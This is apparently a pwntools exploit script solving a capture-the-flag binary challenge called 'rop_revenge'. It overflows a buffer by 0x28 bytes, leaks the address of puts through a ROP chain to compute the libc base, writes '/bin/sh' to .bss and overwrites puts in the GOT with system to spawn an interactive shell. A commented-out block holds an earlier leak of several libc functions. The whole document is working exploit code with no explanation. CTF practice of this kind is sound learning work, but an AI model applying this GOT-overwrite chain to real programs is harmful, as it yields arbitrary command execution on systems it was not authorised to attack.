from pwn import *
context.arch = 'amd64'

elf = ELF('../distribute/share/rop_revenge')

p = process('../distribute/share/rop_revenge')
# p = remote('0.0.0.0', 30007)

pop_rdi = 0x00000000004012a3
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
gets_plt = elf.plt['gets']
gets_got = elf.got['gets']
setvbuf_got = elf.got['setvbuf']
bss = 0x404100

info(f'put_got: {hex(puts_got)}')
info(f'put_got: {hex(puts_plt)}')

# leak libc
# https://libc.blukat.me/
'''
p.recvline()
payload = b'a' * 0x28
payload += flat([pop_rdi, puts_got, puts_plt, pop_rdi, gets_got, puts_plt, pop_rdi, setvbuf_got, puts_plt])
p.sendline(payload)
puts_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info(f'puts_addr: {hex(puts_addr)}')
p.sendline(payload)
gets_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info(f'gets_addr: {hex(gets_addr)}')
p.sendline(payload)
setvbuf_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info(f'setvbuf_addr: {hex(setvbuf_addr)}')
'''


p.recvline()
payload = b'a' * 0x28
payload += flat([pop_rdi, puts_got, puts_plt, pop_rdi, bss, gets_plt, pop_rdi, puts_got, gets_plt, pop_rdi, bss, puts_plt])
p.sendline(payload)
puts_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info(f'puts_addr: {hex(puts_addr)}')
libc_base = puts_addr - 0x875a0
system_addr = libc_base + 0x55410

p.sendline(b'/bin/sh\x00')
p.sendline(p64(system_addr))


p.interactive()
